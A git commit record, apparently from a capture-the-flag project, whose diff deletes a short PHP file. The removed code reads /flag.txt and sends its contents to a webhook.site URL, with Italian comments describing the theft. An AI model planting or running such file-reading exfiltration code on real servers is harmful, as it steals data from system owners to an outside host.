ba73ef1ad3437a94497ab489ac245c203611c66a
gioLomb <151877251+gioLomb@users.noreply.github.com>
2025-05-04 11:23:12 +0200

    Delete files/duc.php

--- files/duc.php
+++
@@ -1,4 +0,0 @@
-<?php
-$flag = file_get_contents('/flag.txt');  // Legge il flag
-file_get_contents('https://webhook.site/9df70d08-9984-49ad-addc-aed30c647b2d?flag=' . urlencode($flag));  // Invia il flag al tuo webhook
-?>
